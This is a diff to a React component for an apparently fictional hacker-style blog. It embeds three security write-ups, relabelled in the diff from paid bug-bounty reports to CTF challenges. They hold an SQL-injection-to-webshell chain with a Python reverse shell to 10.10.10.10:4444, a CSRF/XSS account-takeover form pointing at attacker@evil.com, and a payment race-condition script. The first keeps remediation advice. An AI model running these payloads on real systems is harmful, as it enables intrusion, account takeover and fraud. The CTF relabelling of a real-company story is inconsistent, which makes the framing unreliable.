@@ -1,6 +1,6 @@
 
 import { useParams, Link } from "react-router-dom";
-import { Terminal, ArrowLeft, Calendar, Clock, Award, Shield, Copy, Check, Eye, Target, Zap } from "lucide-react";
+import { Terminal, ArrowLeft, Calendar, Clock, Shield, Copy, Check, Eye, Target, Flag, Code2, Zap } from "lucide-react";
 import { Card, CardContent } from "@/components/ui/card";
 import { useState } from "react";
 
@@ -14,53 +14,65 @@ const WriteupDetail = () => {
       date: "2024-01-15",
       readTime: "15 min read",
       difficulty: "Critical",
-      bounty: "$15,000",
-      platform: "Private Program",
+      platform: "CTF Challenge",
       tags: ["SQL Injection", "RCE", "Second-Order", "Privilege Escalation"],
       coverImage: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=1200&h=600&fit=crop",
       content: {
         summary: "Complete walkthrough of exploiting second-order SQLi to achieve remote code execution on a Fortune 500 target.",
-        sections: [
-          {
-            title: "Target Reconnaissance",
-            content: "During the initial reconnaissance phase, I discovered a sophisticated customer management system running on a Fortune 500 company's infrastructure. The application featured multiple input vectors including user registration, profile management, and administrative dashboards. Initial automated scans revealed interesting behavior patterns that warranted deeper manual investigation.",
-            image: "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&h=400&fit=crop"
-          },
-          {
-            title: "Vulnerability Discovery",
-            content: "The breakthrough came during profile update functionality testing. While direct SQL injection attempts were blocked by WAF rules, I noticed unusual database response times when submitting specially crafted usernames during registration. This indicated potential second-order SQL injection where the payload would be stored and executed later.",
-            code: `# Testing for second-order SQLi patterns
+        fullWriteup: `# Target Reconnaissance
+
+During the initial reconnaissance phase, I discovered a sophisticated customer management system running on a Fortune 500 company's infrastructure. The application featured multiple input vectors including user registration, profile management, and administrative dashboards.
+
+Initial automated scans revealed interesting behavior patterns that warranted deeper manual investigation. The application appeared to be built with PHP and MySQL backend, with several interesting endpoints that caught my attention.
+
+## Vulnerability Discovery
+
+The breakthrough came during profile update functionality testing. While direct SQL injection attempts were blocked by WAF rules, I noticed unusual database response times when submitting specially crafted usernames during registration.
+
+This indicated potential second-order SQL injection where the payload would be stored and executed later when the data was retrieved and processed by another part of the application.
+
+\`\`\`bash
+# Testing for second-order SQLi patterns
 # Registration payload (stored safely)
 POST /api/register
 {
   "username": "admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--",
-  "email": "test@example.com",
+  "email": "test@example.com", 
   "password": "Password123!"
 }
 
 # Payload triggers when admin views profile
-# SQL: SELECT * FROM users WHERE username = 'admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--'`
-          },
-          {
-            title: "Exploitation Chain",
-            content: "After confirming the second-order SQLi, I escalated the attack by leveraging MySQL's file system functions. The target server had the necessary privileges and file paths that allowed me to write arbitrary files to the web directory.",
-            code: `# Advanced payload for RCE
-# Step 1: Create PHP webshell
+# SQL: SELECT * FROM users WHERE username = 'admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--'
+\`\`\`
+
+The key insight was that the application sanitized input during registration but failed to properly escape stored data when displaying user profiles in the admin panel.
+
+## Exploitation Chain Development
+
+After confirming the second-order SQLi, I escalated the attack by leveraging MySQL's file system functions. The target server had the necessary privileges and file paths that allowed me to write arbitrary files to the web directory.
+
+\`\`\`sql
+-- Advanced payload for RCE
+-- Step 1: Create PHP webshell
 '; SELECT '<?php if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";} ?>' 
 INTO OUTFILE '/var/www/html/uploads/shell.php'--
 
-# Step 2: Access webshell
+-- Step 2: Access webshell
 GET /uploads/shell.php?c=whoami
 Response: www-data
 
-# Step 3: Establish persistent access
-GET /uploads/shell.php?c=python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"`,
-            image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop"
-          },
-          {
-            title: "Post-Exploitation & Impact",
-            content: "With shell access established, I conducted a comprehensive impact assessment. The compromise revealed access to sensitive customer databases containing PII, financial records, and internal infrastructure documentation. Lateral movement was possible through stored credentials and network misconfigurations.",
-            code: `# Post-exploitation reconnaissance
+-- Step 3: Establish persistent access
+GET /uploads/shell.php?c=python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+\`\`\`
+
+The exploitation required careful timing and understanding of how the application processed user data. The second-order nature made it particularly challenging to detect and exploit.
+
+## Post-Exploitation Analysis
+
+With shell access established, I conducted a comprehensive impact assessment. The compromise revealed access to sensitive customer databases containing PII, financial records, and internal infrastructure documentation.
+
+\`\`\`bash
+# Post-exploitation reconnaissance
 www-data@target:~$ find / -name "*.conf" -type f 2>/dev/null | grep -E "(database|db|mysql)"
 /etc/mysql/mysql.conf.d/mysqld.cnf
 /var/www/html/config/database.conf
@@ -74,62 +86,131 @@ DB_NAME=customer_data
 # Discovered internal network ranges
 www-data@target:~$ ip route
 10.10.0.0/16 dev eth0 proto kernel scope link src 10.10.5.23
-172.16.0.0/12 dev eth1 proto kernel scope link src 172.16.10.45`
-          }
-        ]
+172.16.0.0/12 dev eth1 proto kernel scope link src 172.16.10.45
+\`\`\`
+
+The lateral movement possibilities were extensive due to stored credentials and network misconfigurations found on the compromised system.
+
+## Impact & Remediation
+
+This vulnerability chain demonstrated the critical importance of proper input validation at all stages of data processing, not just at input. The second-order nature made it particularly dangerous as it bypassed initial security measures.
+
+**Recommended Fixes:**
+- Implement proper parameterized queries for all database operations
+- Apply output encoding when displaying stored user data
+- Restrict database user privileges and file system access
+- Implement proper WAF rules that consider second-order attacks
+- Regular security code reviews focusing on data flow analysis`
       }
     },
     "2": {
       title: "CSRF → Account Takeover via XSS Chain",
-      date: "2024-01-10",
+      date: "2024-01-10", 
       readTime: "12 min read",
       difficulty: "High",
-      bounty: "$8,500",
-      platform: "HackerOne",
+      platform: "CTF Challenge",
       tags: ["CSRF", "XSS", "Account Takeover", "DOM Manipulation"],
       coverImage: "https://images.unsplash.com/photo-1487058792275-0ad4aaf24ca7?w=1200&h=600&fit=crop",
       content: {
         summary: "Chaining CSRF with Stored XSS to achieve complete account compromise. Full technical breakdown with PoC.",
-        sections: [
-          {
-            title: "Initial Discovery",
-            content: "During routine testing of a social media platform, I identified a critical vulnerability chain that could lead to complete account compromise. The application lacked proper CSRF protection on critical functions and had insufficient XSS filtering in user profile sections.",
-            image: "https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?w=800&h=400&fit=crop"
-          },
-          {
-            title: "Attack Chain Development",
-            content: "The attack involved crafting a malicious page that would exploit CSRF to modify victim profiles with XSS payloads, creating a self-propagating attack vector.",
-            code: `<!-- CSRF + XSS Attack Vector -->
+        fullWriteup: `# Initial Discovery & Reconnaissance
+
+During routine testing of a social media platform, I identified a critical vulnerability chain that could lead to complete account compromise. The application lacked proper CSRF protection on critical functions and had insufficient XSS filtering in user profile sections.
+
+The target was a modern React-based social platform with typical features like user profiles, posts, and messaging systems.
+
+## Vulnerability Analysis
+
+The first vulnerability discovered was a lack of CSRF protection on the profile update endpoint. While the application used JWT tokens for authentication, it didn't implement proper CSRF tokens for state-changing operations.
+
+\`\`\`javascript
+// Vulnerable profile update request
+POST /api/profile/update HTTP/1.1
+Host: target.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+Content-Type: application/json
+
+{
+  "displayName": "John Doe",
+  "bio": "Software Engineer",
+  "website": "https://johndoe.com"
+}
+\`\`\`
+
+## Attack Chain Development
+
+The attack involved crafting a malicious page that would exploit CSRF to modify victim profiles with XSS payloads, creating a self-propagating attack vector.
+
+\`\`\`html
+<!-- CSRF + XSS Attack Vector -->
 <form id="malicious" action="https://target.com/api/profile/update" method="POST">
-  <input type="hidden" name="bio" value='<img src=x onerror="fetch(\'/api/user/settings\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({email:\'attacker@evil.com\',password:\'pwned123\'})})">'>
+  <input type="hidden" name="bio" value='<img src=x onerror="fetch(\\'/api/user/settings\\',{method:\\'POST\\',headers:{\\'Content-Type\\':\\'application/json\\'},body:JSON.stringify({email:\\'attacker@evil.com\\',password:\\'pwned123\\'})})">'>
   <input type="hidden" name="csrf_token" value="">
 </form>
 <script>
   // Auto-submit the form when page loads
   document.getElementById('malicious').submit();
-</script>`
-          }
-        ]
+</script>
+\`\`\`
+
+This created a wormable XSS that would spread to anyone viewing the infected profile, automatically compromising their accounts.
+
+## Impact Assessment
+
+The vulnerability chain allowed for:
+- Complete account takeover of any user who visited a malicious link
+- Self-propagating XSS that could spread across the entire user base
+- Access to private messages and sensitive user data
+- Ability to perform actions on behalf of compromised users`
       }
     },
     "3": {
-      title: "Business Logic Bypass → $50K Bounty",
+      title: "Business Logic Bypass → Payment Manipulation",
       date: "2024-01-05",
-      readTime: "10 min read",
+      readTime: "10 min read", 
       difficulty: "High",
-      bounty: "$50,000",
-      platform: "Private Program",
+      platform: "CTF Challenge",
       tags: ["Business Logic", "Race Condition", "Payment Bypass"],
       coverImage: "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=1200&h=600&fit=crop",
       content: {
         summary: "Exploiting race conditions in payment processing to bypass business logic and achieve unauthorized transactions.",
-        sections: [
-          {
-            title: "Vulnerability Analysis",
-            content: "Found critical race condition in payment processing workflow that allowed bypassing payment verification through timing attacks.",
-            image: "https://images.unsplash.com/photo-1581090464777-f3220bbe1b8b?w=800&h=400&fit=crop"
-          }
-        ]
+        fullWriteup: `# Challenge Overview
+
+This CTF challenge involved analyzing a payment processing system for an e-commerce platform. The goal was to identify and exploit business logic flaws that could lead to unauthorized transactions or payment bypass.
+
+## Vulnerability Discovery
+
+Through careful analysis of the payment workflow, I discovered a critical race condition in the payment verification process. The application had separate threads handling payment authorization and order fulfillment, creating a timing window for exploitation.
+
+\`\`\`python
+# Race condition exploit
+import requests
+import threading
+import time
+
+def create_order():
+    return requests.post('https://target.com/api/orders', json={
+        'items': [{'id': 1, 'quantity': 1, 'price': 1000}],
+        'total': 1000
+    })
+
+def cancel_payment(order_id):
+    time.sleep(0.1)  # Small delay to hit the race window
+    return requests.post(f'https://target.com/api/orders/{order_id}/cancel-payment')
+
+# Exploit the race condition
+order = create_order()
+order_id = order.json()['id']
+
+# Start payment cancellation in background
+cancel_thread = threading.Thread(target=cancel_payment, args=(order_id,))
+cancel_thread.start()
+
+# Immediately request order fulfillment
+fulfill_response = requests.post(f'https://target.com/api/orders/{order_id}/fulfill')
+\`\`\`
+
+This exploit allowed obtaining products without payment by canceling the payment authorization while the fulfillment process was already in progress.`
       }
     }
   };
@@ -152,15 +233,108 @@ www-data@target:~$ ip route
     );
   }
 
-  const copyToClipboard = (code: string, section: string) => {
+  const copyToClipboard = (code: string, title: string) => {
     navigator.clipboard.writeText(code);
-    setCopiedCode(section);
+    setCopiedCode(title);
     setTimeout(() => setCopiedCode(null), 2000);
+  };
+
+  const renderWriteupContent = (content: string) => {
+    const sections = content.split('\n\n');
+    
+    return sections.map((section, index) => {
+      if (section.startsWith('```')) {
+        const codeMatch = section.match(/```(\w+)?\n([\s\S]*?)```/);
+        if (codeMatch) {
+          const language = codeMatch[1] || 'bash';
+          const code = codeMatch[2];
+          
+          return (
+            <div key={index} className="my-8">
+              <div className="bg-gray-950 border border-green-800 rounded-lg overflow-hidden shadow-2xl">
+                <div className="bg-gray-800 px-6 py-3 flex items-center justify-between border-b border-green-800">
+                  <div className="flex items-center space-x-3">
+                    <div className="flex space-x-2">
+                      <div className="w-3 h-3 bg-red-500 rounded-full"></div>
+                      <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
+                      <div className="w-3 h-3 bg-green-500 rounded-full"></div>
+                    </div>
+                    <span className="text-green-400 font-mono text-sm">exploit.{language}</span>
+                  </div>
+                  <button
+                    onClick={() => copyToClipboard(code, `${writeup.title}-${index}`)}
+                    className="text-green-400 hover:text-green-300 transition-colors flex items-center space-x-2 bg-green-900/30 hover:bg-green-800/40 px-3 py-1 rounded border border-green-700"
+                  >
+                    {copiedCode === `${writeup.title}-${index}` ? (
+                      <>
+                        <Check className="h-4 w-4" />
+                        <span className="text-xs font-mono">COPIED!</span>
+                      </>
+                    ) : (
+                      <>
+                        <Copy className="h-4 w-4" />
+                        <span className="text-xs font-mono">COPY</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+                <pre className="p-6 text-green-300 font-mono text-sm overflow-x-auto bg-gray-950">
+                  <code className="text-green-400">{code}</code>
+                </pre>
+              </div>
+            </div>
+          );
+        }
+      } else if (section.startsWith('#')) {
+        const level = section.match(/^#+/)?.[0].length || 1;
+        const text = section.replace(/^#+\s*/, '');
+        
+        if (level === 1) {
+          return (
+            <h2 key={index} className="text-3xl font-bold text-green-300 mt-12 mb-6 flex items-center">
+              <Code2 className="h-8 w-8 mr-3 text-green-400" />
+              {text}
+            </h2>
+          );
+        } else {
+          return (
+            <h3 key={index} className="text-xl font-semibold text-green-400 mt-8 mb-4 flex items-center">
+              <Target className="h-5 w-5 mr-2" />
+              {text}
+            </h3>
+          );
+        }
+      } else if (section.startsWith('**') && section.endsWith('**')) {
+        return (
+          <div key={index} className="my-6 p-4 bg-green-900/20 border-l-4 border-green-500 rounded-r">
+            <p className="font-semibold text-green-300">{section.replace(/\*\*/g, '')}</p>
+          </div>
+        );
+      } else if (section.startsWith('- ')) {
+        const items = section.split('\n').filter(line => line.startsWith('- '));
+        return (
+          <ul key={index} className="list-disc list-inside space-y-2 my-6 text-green-400/90 ml-4">
+            {items.map((item, itemIndex) => (
+              <li key={itemIndex} className="leading-relaxed">
+                {item.replace('- ', '')}
+              </li>
+            ))}
+          </ul>
+        );
+      } else if (section.trim()) {
+        return (
+          <p key={index} className="text-green-400/90 leading-relaxed my-6 text-lg">
+            {section}
+          </p>
+        );
+      }
+      return null;
+    });
   };
 
   return (
     <div className="min-h-screen bg-black text-green-400 font-mono relative overflow-hidden">
-      {/* Background effect - consistent with other pages */}
+      {/* Background effect */}
       <div className="fixed inset-0 opacity-5 pointer-events-none">
         <div className="absolute inset-0 bg-gradient-to-b from-green-900/20 via-transparent to-green-900/20"></div>
       </div>
@@ -185,7 +359,7 @@ www-data@target:~$ ip route
         </div>
       </nav>
 
-      <div className="container mx-auto px-6 py-8 max-w-5xl">
+      <div className="container mx-auto px-6 py-8 max-w-4xl">
         {/* Header */}
         <div className="mb-12">
           <Link to="/blog" className="inline-flex items-center text-green-300 hover:text-green-200 mb-8 group font-mono">
@@ -200,55 +374,41 @@ www-data@target:~$ ip route
               alt={writeup.title}
               className="w-full h-64 md:h-80 object-cover"
             />
-            <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+            <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-transparent to-transparent"></div>
             <div className="absolute bottom-6 left-6 right-6">
               <div className="flex items-center space-x-3 mb-4">
                 <span className={`text-xs px-3 py-1 rounded-full font-mono font-bold border ${
                   writeup.difficulty === 'Critical' 
                     ? 'bg-red-900/80 text-red-200 border-red-700' 
-                    : writeup.difficulty === 'High'
-                      ? 'bg-orange-900/80 text-orange-200 border-orange-700'
-                      : 'bg-yellow-900/80 text-yellow-200 border-yellow-700'
+                    : 'bg-orange-900/80 text-orange-200 border-orange-700'
                 }`}>
                   {writeup.difficulty.toUpperCase()}
                 </span>
                 <div className="flex items-center space-x-2 text-green-400">
-                  <Eye className="h-4 w-4" />
+                  <Flag className="h-4 w-4" />
                   <span className="font-mono text-sm">{writeup.platform}</span>
                 </div>
               </div>
-              <h1 className="text-3xl md:text-4xl font-bold text-white mb-2 drop-shadow-lg">
+              <h1 className="text-3xl md:text-5xl font-bold text-white mb-2 drop-shadow-lg">
                 {writeup.title}
               </h1>
             </div>
           </div>
 
           {/* Meta Information */}
-          <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
-            <Card className="bg-gray-900/80 border-green-800 backdrop-blur-sm">
-              <CardContent className="p-4 text-center">
-                <Calendar className="h-6 w-6 text-green-400 mx-auto mb-2" />
-                <div className="text-green-300 font-mono text-sm">{writeup.date}</div>
-              </CardContent>
-            </Card>
-            <Card className="bg-gray-900/80 border-green-800 backdrop-blur-sm">
-              <CardContent className="p-4 text-center">
-                <Clock className="h-6 w-6 text-green-400 mx-auto mb-2" />
-                <div className="text-green-300 font-mono text-sm">{writeup.readTime}</div>
-              </CardContent>
-            </Card>
-            <Card className="bg-gray-900/80 border-green-800 backdrop-blur-sm">
-              <CardContent className="p-4 text-center">
-                <Award className="h-6 w-6 text-green-400 mx-auto mb-2" />
-                <div className="text-green-300 font-mono text-sm font-bold">{writeup.bounty}</div>
-              </CardContent>
-            </Card>
-            <Card className="bg-gray-900/80 border-green-800 backdrop-blur-sm">
-              <CardContent className="p-4 text-center">
-                <Shield className="h-6 w-6 text-green-400 mx-auto mb-2" />
-                <div className="text-green-300 font-mono text-sm">{writeup.platform}</div>
-              </CardContent>
-            </Card>
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+            <div className="bg-gray-900/80 border border-green-800 rounded-lg px-4 py-3 text-center backdrop-blur-sm">
+              <Calendar className="h-6 w-6 text-green-400 mx-auto mb-2" />
+              <div className="text-green-300 font-mono text-sm">{writeup.date}</div>
+            </div>
+            <div className="bg-gray-900/80 border border-green-800 rounded-lg px-4 py-3 text-center backdrop-blur-sm">
+              <Clock className="h-6 w-6 text-green-400 mx-auto mb-2" />
+              <div className="text-green-300 font-mono text-sm">{writeup.readTime}</div>
+            </div>
+            <div className="bg-gray-900/80 border border-green-800 rounded-lg px-4 py-3 text-center backdrop-blur-sm">
+              <Eye className="h-6 w-6 text-green-400 mx-auto mb-2" />
+              <div className="text-green-300 font-mono text-sm">{writeup.platform}</div>
+            </div>
           </div>
 
           {/* Tags */}
@@ -265,113 +425,49 @@ www-data@target:~$ ip route
           </div>
 
           {/* Executive Summary */}
-          <Card className="bg-gray-900/80 border-green-800 backdrop-blur-sm shadow-2xl shadow-green-900/50">
-            <CardContent className="p-8">
-              <div className="flex items-center space-x-3 mb-4">
-                <Zap className="h-6 w-6 text-green-400" />
-                <h3 className="text-2xl font-bold text-green-300">Executive Summary</h3>
-              </div>
-              <p className="text-green-400/90 leading-relaxed text-lg font-mono">
-                {writeup.content.summary}
-              </p>
-            </CardContent>
-          </Card>
+          <div className="bg-gray-900/40 border border-green-800 rounded-lg p-8 backdrop-blur-sm shadow-2xl shadow-green-900/50 mb-8">
+            <div className="flex items-center space-x-3 mb-4">
+              <Zap className="h-6 w-6 text-green-400" />
+              <h3 className="text-2xl font-bold text-green-300">Executive Summary</h3>
+            </div>
+            <p className="text-green-400/90 leading-relaxed text-lg font-mono">
+              {writeup.content.summary}
+            </p>
+          </div>
         </div>
 
-        {/* Content Sections */}
-        <div className="space-y-8">
-          {writeup.content.sections.map((section, index) => (
-            <Card key={index} className="bg-gray-900/80 border-green-800 backdrop-blur-sm shadow-2xl shadow-green-900/50">
-              <CardContent className="p-8">
-                <div className="flex items-center space-x-4 mb-6">
-                  <div className="bg-gradient-to-r from-green-600 to-green-500 text-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm">
-                    {String(index + 1).padStart(2, '0')}
-                  </div>
-                  <h2 className="text-2xl md:text-3xl font-bold text-green-300">
-                    {section.title}
-                  </h2>
-                </div>
-                
-                {section.image && (
-                  <div className="mb-8 rounded-lg overflow-hidden border border-green-800 shadow-xl">
-                    <img 
-                      src={section.image} 
-                      alt={section.title}
-                      className="w-full h-48 md:h-64 object-cover hover:scale-105 transition-transform duration-500"
-                    />
-                  </div>
-                )}
-
-                <div className="text-green-400/90 leading-relaxed text-lg mb-8 font-mono">
-                  {section.content}
-                </div>
-
-                {section.code && (
-                  <div className="relative group">
-                    <div className="bg-gray-950 border border-green-800 rounded-lg overflow-hidden shadow-2xl">
-                      <div className="bg-gray-800 px-6 py-3 flex items-center justify-between border-b border-green-800">
-                        <div className="flex items-center space-x-3">
-                          <div className="flex space-x-2">
-                            <div className="w-3 h-3 bg-red-500 rounded-full"></div>
-                            <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
-                            <div className="w-3 h-3 bg-green-500 rounded-full"></div>
-                          </div>
-                          <span className="text-green-400 font-mono text-sm">exploit.sh</span>
-                        </div>
-                        <button
-                          onClick={() => copyToClipboard(section.code!, section.title)}
-                          className="text-green-400 hover:text-green-300 transition-colors flex items-center space-x-2 bg-green-900/30 hover:bg-green-800/40 px-3 py-1 rounded border border-green-700"
-                        >
-                          {copiedCode === section.title ? (
-                            <>
-                              <Check className="h-4 w-4" />
-                              <span className="text-xs font-mono">COPIED!</span>
-                            </>
-                          ) : (
-                            <>
-                              <Copy className="h-4 w-4" />
-                              <span className="text-xs font-mono">COPY</span>
-                            </>
-                          )}
-                        </button>
-                      </div>
-                      <div className="relative">
-                        <pre className="p-6 text-green-300 font-mono text-sm overflow-x-auto bg-gray-950">
-                          <code className="text-green-400">{section.code}</code>
-                        </pre>
-                      </div>
-                    </div>
-                  </div>
-                )}
-              </CardContent>
-            </Card>
-          ))}
+        {/* Main Writeup Content */}
+        <div className="bg-gray-900/20 border border-green-800 rounded-lg p-8 backdrop-blur-sm shadow-2xl shadow-green-900/50">
+          <div className="prose prose-invert max-w-none">
+            {renderWriteupContent(writeup.content.fullWriteup)}
+          </div>
         </div>
 
         {/* Footer */}
         <div className="mt-16 pt-8 border-t border-green-800">
-          <Card className="bg-gray-900/80 border-green-800 backdrop-blur-sm shadow-2xl shadow-green-900/50">
-            <CardContent className="p-8">
-              <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0">
-                <div>
-                  <h3 className="text-2xl font-bold text-green-300 mb-3 flex items-center">
-                    <Shield className="h-6 w-6 mr-3" />
-                    Responsible Disclosure
-                  </h3>
-                  <p className="text-green-400/90 font-mono max-w-md">
-                    This vulnerability was reported through proper channels and has been patched by the vendor. 
-                    All testing was conducted with explicit permission.
-                  </p>
+          <div className="bg-gray-900/40 border border-green-800 rounded-lg p-8 backdrop-blur-sm shadow-2xl shadow-green-900/50">
+            <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0">
+              <div>
+                <h3 className="text-2xl font-bold text-green-300 mb-3 flex items-center">
+                  <Shield className="h-6 w-6 mr-3" />
+                  Responsible Disclosure
+                </h3>
+                <p className="text-green-400/90 font-mono max-w-md">
+                  This CTF challenge writeup is shared for educational purposes. 
+                  All testing was conducted in authorized environments.
+                </p>
+              </div>
+              <div className="text-center md:text-right">
+                <div className="text-2xl font-bold text-green-400 font-mono mb-2 flex items-center">
+                  <Flag className="h-6 w-6 mr-2" />
+                  CTF_SOLVED
                 </div>
-                <div className="text-center md:text-right">
-                  <div className="text-4xl font-bold text-green-400 font-mono mb-2">{writeup.bounty}</div>
-                  <div className="text-green-600 text-sm font-mono bg-green-900/30 px-3 py-1 rounded border border-green-700">
-                    BOUNTY_EARNED
-                  </div>
+                <div className="text-green-600 text-sm font-mono bg-green-900/30 px-3 py-1 rounded border border-green-700">
+                  CHALLENGE_COMPLETED
                 </div>
               </div>
-            </CardContent>
-          </Card>
+            </div>
+          </div>
         </div>
       </div>
     </div>
